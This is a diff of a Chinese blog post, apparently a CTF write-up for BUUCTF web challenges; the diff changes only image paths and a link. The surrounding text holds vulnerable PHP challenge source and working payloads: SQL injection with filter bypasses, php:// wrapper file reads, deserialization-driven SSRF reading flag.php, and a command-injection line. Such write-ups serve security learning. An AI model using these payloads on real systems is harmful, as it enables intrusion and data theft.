class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
 <p>首先要读取文件内容，需要使用到php伪协议，加密的时候不要加双引号。</p>
-<p><img src="buu/36.png"></p>
+<p><img src="/2021/04/01/buu/36.png"></p>
 <p>再读取useless.php文件内容：</p>
-<p><img src="buu/37.png"></p>
+<p><img src="/2021/04/01/buu/37.png"></p>
 <p>base64解码得到源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>这里的file是可控的，我们修改成我们需要的然后进行序列化。</p>
-<p><img src="buu/38.png"></p>
+<p><img src="/2021/04/01/buu/38.png"></p>
 <p>这里还要给file赋值useless.php,文件包含的是useless.php。</p>
-<p><img src="buu/39.png"></p>
+<p><img src="/2021/04/01/buu/39.png"></p>
 <p>最后payload：</p>
 <p><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
 <p>f12就找到flag了。</p>
@@ -545,18 +545,18 @@
 <h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><p>首先输入一个单引号出现报错，并且在密码附近，所以注入点应该在密码。</p>
 <p>再测试一下，发现符号||被过滤了，我们可以用异或符号代替，^，这个方法很好用。</p>
 <p>使用函数updatexml()实现报错注入。</p>
-<p><img src="buu/40.png"></p>
+<p><img src="/2021/04/01/buu/40.png"></p>
 <p>爆出数据库，然后通过括号绕过空格过滤，用like代替=，爆出数据表。</p>
 <p><code>?username=admin&amp;password=&#39;^updatexml(1,concat(0x7c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))),1)%23</code></p>
-<p><img src="buu/41.png"></p>
+<p><img src="/2021/04/01/buu/41.png"></p>
 <p>爆出字段名</p>
-<p><img src="buu/42.png"></p>
+<p><img src="/2021/04/01/buu/42.png"></p>
 <p>爆出flag。</p>
 <p><code>?username=admin&amp;password=&#39;^updatexml(1,concat(0x7c,(select(group_concat(id,username,password))from(H4rDsq1))),1)%23</code></p>
-<p><img src="buu/43.png"></p>
+<p><img src="/2021/04/01/buu/43.png"></p>
 <p>好像还有一半，我们想用limit函数查一下，但是加了括号函数就会报错，可以使用left()right()语句查询拼接。</p>
 <p><code>?username=admin&amp;password=&#39;^updatexml(1,concat(0x7c(select(group_concat(right(password,30)))from(H4rDsq1))),1)%23</code></p>
-<p><img src="buu/44.png"></p>
+<p><img src="/2021/04/01/buu/44.png"></p>
 <p>最后拼接得到flag。</p>
 <p><strong>本题关键：异或报错注入，like代替=绕过空格，left和right函数使用。</strong></p>
 <h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>先注册一个，然后发现用户名可以点击，跳转新的url，url末尾通过?no=传参。</p>
@@ -568,7 +568,7 @@
 <p>直接爆库，发现存在waf，这里get了新姿势，通过/**/绕过空格的</p>
 <p><code>?no=-1/**/union/**/select/**/1,database(),3,4</code></p>
 <p>这里选择字段2，因为字段2在页面才有回显，爆出库名为fakebook </p>
-<p><img src="buu/45.png"></p>
+<p><img src="/2021/04/01/buu/45.png"></p>
 <p>查表：</p>
 <p><code>?no=-1/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()),3,4</code></p>
 <p>得到表users，这里一般后面不直接接库名，不然怕还有waf。</p>
@@ -576,7 +576,7 @@
 <p><code>?no=-1/**/union/**/select/**/1,(select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=&#39;users&#39;),3,4</code></p>
 <p>先爆几个比较重要的字段。</p>
 <p><code>?no=-1/**/union/**/select/**/1,(select/**/group_concat(username,passwd,data)from/**/users),3,4</code></p>
-<p><img src="buu/46.png"></p>
+<p><img src="/2021/04/01/buu/46.png"></p>
 <p>看见序列化，这里并没有flag，应该还有别的页面，跑一下目录。</p>
 <p>扫到robots.txt，访问一下，user.php.bak，下载源码。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -584,14 +584,14 @@
 <p>再看一下data数据的内容：O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:15;s:4:”blog”;s:16:”sadasd.github.io”;}</p>
 <p>还记得前面报错有出现unserialize()函数，我们这里需要对什么进行序列化？</p>
 <p>很明显跟博客地址有关系，再看看一开始的图片，相当于把这个图片内容打印出来，我们可以通过这个方式读取flag。</p>
-<p><img src="buu/47.png"></p>
+<p><img src="/2021/04/01/buu/47.png"></p>
 <p>由于blog在字段4，我们就在字段4构造序列化，通过file://读取文件造成ssrf漏洞,(<strong>序列化后传入，系统将其反序列化，我们成功传入值会被传递到页面ifram里面 这样就造成SSRF攻击</strong>)</p>
 <p><code>?no=-1/**/union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:15;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;</code></p>
 <p>返回了内容，通过burp查看，</p>
-<p><img src="buu/48.png"></p>
+<p><img src="/2021/04/01/buu/48.png"></p>
 <p>这题是sql注入和ssrf注入漏洞结合。</p>
 <p><strong>本题关键：数字型注入，注释符代替空格，序列化ssrf攻击。</strong></p>
-<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p><img src="buu/49.png"></p>
+<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p><img src="/2021/04/01/buu/49.png"></p>
 <p><strong>Base32编码是使用32个可打印字符（字母A-Z和数字2-7）对任意字节数据进行编码的方案，编码后的字符串不用区分大小写并排除了容易混淆的字符，可以方便地由人类使用并由计算机处理。</strong></p>
 <p><strong>Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码。</strong></p>
 <p><strong>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。</strong>  <em><strong>一般看后缀有个=就很好区别出来。</strong></em></p>
@@ -599,19 +599,19 @@
 <p><code>select * from user where username = &#39;$name&#39;**</code></p>
 <p>可以知道表名是user，单引号注入型。</p>
 <p>union和select都被过滤了，get新姿势，直接盲猜字段数量。</p>
-<p><img src="buu/50.png"></p>
+<p><img src="/2021/04/01/buu/50.png"></p>
 <p>再输入3，没报字段数错误，可以得到字段数为3。</p>
-<p><img src="buu/51.png"></p>
+<p><img src="/2021/04/01/buu/51.png"></p>
 <p>括号被过滤了，很难受。想不到其他办法，测试耗时间，直接源码。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;Do you know who am I?&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require &quot;config.php&quot;;</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">// 去除转义</span><br><span class="line">if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">	function stripslashes_deep($value)</span><br><span class="line">	&#123;</span><br><span class="line">		$value = is_array($value) ?</span><br><span class="line">		array_map(&#x27;stripslashes_deep&#x27;, $value) :</span><br><span class="line">		stripslashes($value);</span><br><span class="line">		return $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);</span><br><span class="line">	$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);</span><br><span class="line">	$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);</span><br><span class="line">	$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$password = $_POST[&#x27;pw&#x27;];</span><br><span class="line">$t_pw = md5($password);</span><br><span class="line">$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">// echo $sql;</span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;//过滤</span><br><span class="line">	die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	if (!$result) &#123;</span><br><span class="line">		printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		// echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">		$arr = mysqli_fetch_row($result);</span><br><span class="line">		// print_r($arr);</span><br><span class="line">		if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">			if(md5($password) == $arr[2])&#123;</span><br><span class="line">				echo $flag;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				die(&quot;wrong pass!&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			die(&quot;wrong user!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>知识点：MySQL在查询数据不存在时，联合查询会构造一个虚拟的数据在数据库中。</p>
-<p><img src="buu/52.png"></p>
+<p><img src="/2021/04/01/buu/52.png"></p>
 <p>这里两个条件，返回三个字段数据，第一个if要求字段2数据为“admin”</p>
 <p>第二个if要求password经md5加密=字段3的数据。</p>
 <p>构造payload：</p>
 <p><code>name=-admin&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39; %23&amp;pw=123</code></p>
-<p><img src="buu/53.png"></p>
+<p><img src="/2021/04/01/buu/53.png"></p>
 <p><strong>本题关键：MySQL查询数据，不存在会自动创建一个虚拟的数据在数据库中。</strong></p>
 <h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a><strong>[网鼎杯 2020 青龙组]AreUSerialz</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -663,14 +663,14 @@
 
 
 <p>通过数组绕过第一if条件。</p>
-<p><img src="buu/54.png"></p>
+<p><img src="/2021/04/01/buu/54.png"></p>
 <p>因为md5加密数组的结果都为null值，两个比较相等。</p>
 <p>第二个绕过也很简单，弱类型比较，post提交参数,得到flag。</p>
-<p><img src="buu/55.png"></p>
+<p><img src="/2021/04/01/buu/55.png"></p>
 <p><strong>本题关键：弱类型比较，md5绕过。</strong></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><em><strong>1、对于sql注入，fuzz测试来检查过被过滤的符号。</strong></em></p>
 <p><em><strong>2、在MySQL查询数据时，多加不存在的字段名，MySQL会新创建出来，不会出现语法错误。</strong></em></p>
-<p><img src="buu/56.png"></p>
+<p><img src="/2021/04/01/buu/56.png"></p>
 <p><em><strong>3、php伪协议，在ctf中php://filter很常用，php:input和data经常被过滤。</strong></em></p>
 <p><em><strong>4、内联执行：内联，就是将反引号内命令的输出作为输入执行。</strong></em><br><em><strong>如：pingpingping那题</strong></em></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>
@@ -724,7 +724,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://example.com/2021/04/01/buu/" title="buu">http://example.com/2021/04/01/buu/</a>
+    <a href="https://chutingting520.github.io/2021/04/01/buu/" title="buu">https://chutingting520.github.io/2021/04/01/buu/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
